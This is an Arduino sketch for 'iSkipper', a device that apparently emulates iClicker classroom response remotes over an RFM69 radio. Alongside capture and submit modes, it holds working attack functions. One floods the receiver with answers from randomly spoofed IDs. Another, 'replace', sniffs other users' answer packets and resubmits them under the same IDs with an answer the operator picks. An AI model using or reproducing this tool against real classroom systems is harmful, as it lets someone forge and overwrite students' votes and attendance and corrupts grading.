/*
 Name:		iSkipper_Arduino_Sketch_New.ino
 Created:	2019/2/12 2:09:07
 Author:	CSR
*/

#include <iClickerEmulator.h>
#include <RingBufCPP.h>
#include "SerialSymbols.h"
#include <string.h>
#include <assert.h>

/*************************Change These Constants Below To Fit Your Hardware!***************************/
/**/                                                                                                /**/
/**/#define IS_RFM69HW true //make true if using w version                                          /**/
/**/#define IRQ_PIN 3       // Must Be 3 for Arduino Nano                                           /**/
/**/#define CSN 10          // NSS pin,10 for Arduino Nano                                          /**/
/**/constexpr uint32_t FIXED_ISKIPPER_ID = 0xCDCDCDCD;//The Fixed ID for emulating a normal iClikcer/**/
/**/                                                                                                /**/
/*************************Change These Constants Above To Fit Your Hardware!***************************/


/*Important Constants*/
#define SERIAL_BAUD_RATE 115200 //Baud rate
#define MAX_BUFFERED_PACKETS 5 //The capability of radio receiving buffer
#define MAX_SERIAL_COMMAND_LENGTH 20 //The max length of the command from serial ports
#define SERIAL_NO_COMMAND_WAIT_TIME 3000 //The waiting time to promote for input if there is no input command
/*End Important Constants*/

//Global Variables
char serialCommand[MAX_SERIAL_COMMAND_LENGTH];
RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> recvBuf;
iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);

// the setup function runs once when you press reset or power the board
void setup()
{
	Serial.begin(SERIAL_BAUD_RATE);
	clicker.begin(iClickerChannels::AA);
	uint8_t thisID[4];
	intToByteArray(FIXED_ISKIPPER_ID, thisID);
	while (Serial.read() != OP_COMFIRM_CONNECTION) //Wait until connect
	{
		Serial.println(F("Initialization Complete. Waiting for COM command..."));
		for (uint16_t wait = SERIAL_NO_COMMAND_WAIT_TIME; wait > 0; wait--)
		{
			if (Serial.available() > 0)
				break;
			delay(1);
		}
	}
	/*Connection Response Format:
	*	Connection Established! iSkipper ID:\n
	*	[ACK]\n
	*	[ID]\n
	*/
	Serial.println(F("Connection Established! iSkipper ID:"));
	Serial.println(RES_COMFIRM_CONNECTION);
	char strID[9];
	snprintf(strID, sizeof(strID), "%02X%02X%02X%02X", thisID[0], thisID[1], thisID[2], thisID[3]);
	Serial.println(strID);
}

// the loop function runs over and over again until power down or reset
void loop()
{
	char op = processSerialInput(serialCommand, sizeof(serialCommand));
	switch (op)
	{
	case OP_CAPTURE:
	{
		capture();
		break;
	}
	case OP_SUBMIT:
	{
		submitMode();
		break;
	}
	case OP_ANSWER:
	{
		//Repeat 10 times to make sure it succeed, since we can't decode ACK from the base.
		answer(serialCommand[0], 10);
		break;
	}
	case OP_CHANGE_CHANNEL:
	{
		changeChannel(serialCommand);
		break;
	}
	case OP_ATTACK:
	{
		attack(serialCommand[0], strtoul(&serialCommand[2], NULL, 10));
		break;
	}
	case OP_REPLACE:
	{
		replace(serialCommand[0]);
		break;
	}
	case OP_RESET:
	{
		reset();
		break;
	}
	default:
	{
		idle();
		break;
	}
	}

}

void recvPacketHandler(iClickerPacket *recvd)
{
	recvBuf.add(*recvd);
}

static inline void idle()
{
	Serial.println(RES_STANDBY);
	Serial.println(F("No Running Progress, waiting for commands..."));
	for (uint16_t wait = SERIAL_NO_COMMAND_WAIT_TIME; wait > 0; wait--)
	{
		if (Serial.available() > 0)
			break;
		delay(1);
	}
	return;
}

static inline void capture()
{
	/*Start Capturing Response Format:
	*	Start capture\n
	*	[ACK]\n
	*/
	Serial.println(F("Start capture"));
	Serial.println(RES_SUCCESS);

	const char reponseFormat[] = "Captured,%c,%02X%02X%02X%02X\n"; //Reponse Format
	iClickerPacket r;
	const uint8_t* id;
	char ans;
	char msg[50];
	clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	while (!shouldStop())
	{
		while (recvBuf.pull(&r))
		{
			id = r.packet.answerPacket.id;
			ans = iClickerEmulator::answerChar((iClickerAnswer)r.packet.answerPacket.answer);
			snprintf(msg, sizeof(msg), reponseFormat, ans, id[0], id[1], id[2], id[3]);
			Serial.print(msg);
		}
	}
	clicker.stopPromiscuous();
	Serial.println(F("End Capture"));
}

static inline void answer(const char cAns, const uint8_t repeat)
{
	uint8_t thisID[4];
	intToByteArray(FIXED_ISKIPPER_ID, thisID);
	Serial.println(F("Submit Answer:"));
	Serial.println(cAns);
	for (uint8_t i = 0; i < repeat; i++)
	{
		clicker.submitAnswer(thisID, clicker.charAnswer(cAns), false);
		Serial.println(F("Submit Success!"));
		Serial.println(RES_SUCCESS);
	}
}

static inline void submitMode()
{
	Serial.println(F("Start SUBMIT mode, waiting for input..."));
	Serial.println(RES_SUCCESS);
	/*Format:
	*	<Answer>,<ID>\0
	*/
	uint8_t readLength = 0;
	char answerAndID[11];//Answer for 1 byte, comma for 1 byte, ID for 8 byte,\0 for 1 byte
	while (true)
	{
		while (readLength < sizeof(answerAndID) - 1)
		{
			while (Serial.available() <= 0);//Wait for input
			char c = 0;
			Serial.readBytes(&c, 1);
			if (c == OP_STOP)
				goto end; //End here
			answerAndID[readLength++] = c;
			if (c == '\0' && readLength != sizeof(answerAndID) - 1)//That means the input is not in correct forms.
			{
				readLength = 0;
				continue;
			}
		}
		readLength = 0;
		char cAns = answerAndID[0];
		uint32_t iID = strtoul(&answerAndID[2], NULL, 16);
		uint8_t arrID[4];
		intToByteArray(iID, arrID);
		if (!clicker.validId(arrID))
		{
			Serial.println(F("Invalid ID"));
			continue;
		}
		clicker.submitAnswer(arrID, clicker.charAnswer(cAns), false);
		Serial.println(RES_SUCCESS);
	}
end:
	Serial.println(F("End SUBMIT mode."));
	return;
}

static inline void attack(const char cAns, unsigned long count)
{
	/*Command Format:
	*	A,<Answer>,<Counts>/0
	*Start attacking Response Format:
	*	Start Attack\n
	*	[ACK]\n
	*/
	Serial.println(F("Start Attack"));
	Serial.println(RES_SUCCESS);
	iClickerAnswer ans;
	uint8_t id[ICLICKER_ID_LEN];
	for (unsigned long i = 0; i < count && !shouldStop(); i++)
	{
		if ((cAns >= 'A' && cAns <= 'E') || cAns == 'P')
			ans = clicker.charAnswer(cAns);
		else
			ans = clicker.randomAnswer();
		clicker.randomId(id);
		clicker.submitAnswer(id, ans, false);
		Serial.print(".");
		if (i % 10 == 0)
			Serial.println();
		if (cAns != 'P')
			delay(5); //To make recieved count be accurate.
	}
	Serial.println(F("\nAttack Finished"));
}

static inline void changeChannel(const char* const arguments)
{
	/*Command Format:
	*	c,<Channel>/0
	*/
	clicker.setChannel(getChannelByString(arguments));
	if (arguments[0] > 'D' || arguments[0] < 'A' || arguments[1] > 'D' || arguments[1] < 'A')
	{
		Serial.println(F("Illegal input Channel, set to default AA channel"));
		Serial.println(RES_FAIL);
	}
	else
	{
		Serial.println(RES_SUCCESS);
		Serial.print(F("Successfully change channel to: "));
		Serial.print(arguments[0]);
		Serial.print(arguments[1]);
		Serial.println();
	}
}

static inline void replace(const char cTargetAns)
{
	/*Start Replacing Response Format:
	*	Start capture\n
	*	[ACK]\n
	*/
	Serial.println(F("Start Replacing"));
	Serial.println(RES_SUCCESS);

	const char reponseFormat[] = "Replaced,%c,%02X%02X%02X%02X\n"; //Reponse Format
	iClickerPacket r;
	uint8_t* id;
	char ans;
	char msg[50];
	bool recieved = false;
	clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	while (!shouldStop())
	{
		while (recvBuf.pull(&r))
		{
			recieved = true;
			clicker.stopPromiscuous();
			id = r.packet.answerPacket.id;
			ans = iClickerEmulator::answerChar((iClickerAnswer)r.packet.answerPacket.answer);
			clicker.submitAnswer(id, clicker.charAnswer(cTargetAns));
			snprintf(msg, sizeof(msg), reponseFormat, ans, id[0], id[1], id[2], id[3]);
			Serial.print(msg);
		}
		if(recieved)
		{
			clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
			recieved = false;
		}
	}
	clicker.stopPromiscuous();
	Serial.println(F("End Replacing"));
}

/*
*Read input commands from Serial ports
*Here are the command formats:
*		<COMMAND_CHAR>+','+<COMMAND_ARGUMENTS>+'\0'
*Returns the COMMAND_CHAR input command, and store arguments into argument[].
*/
static inline char processSerialInput(char* const argument, const uint16_t size)
{
	if (Serial.available() > 0)
	{
		size_t readLength = Serial.readBytesUntil('\0', argument, size);
		argument[readLength] = '\0';
		char cOperation = argument[0];
		//Shift left
		for (uint8_t i = 0; i < size - 2; i++)
		{
			argument[i] = argument[i + 2];
		}
		return cOperation;
	}
	return OP_INVALID_OPERATION;
}


//Output pointer must point to an array of exactly 4 Byte.
static inline void intToByteArray(const uint32_t input, uint8_t output[4])
{
	output[0] = input >> 24;
	output[1] = input >> 16 & 0xFF;
	output[2] = input >> 8 & 0xFF;
	output[3] = input & 0xFF;
}

//Return the Channel base on the first two chars in string, return AA if illegal input. 
static iClickerChannel getChannelByString(const char *const str)
{
	uint16_t index = (str[0] - 'A') * 4 + (str[1] - 'A'); //Calculate channel index in channels[] array
	if (index > NUM_ICLICKER_CHANNELS - 1 || index < 0)
		return iClickerChannels::channels[0]; //return AA if illegal input
	return iClickerChannels::channels[index];
}

//Check whether there is an OP_STOP recieved
static inline bool shouldStop()
{
	return Serial.read() == OP_STOP;
}

//Reset function jump to address 0, this would not fix problem caused by wild pointers.
static inline void reset()
{
	__asm("jmp 0");
}

//Check validation of fixed id
static_assert(((FIXED_ISKIPPER_ID >> 24) ^ (FIXED_ISKIPPER_ID >> 16 & 0xFF) ^ (FIXED_ISKIPPER_ID >> 8 & 0xFF)) == (FIXED_ISKIPPER_ID & 0xFF),
	"Your FIXED_ISKIPPER_ID is not valid!");
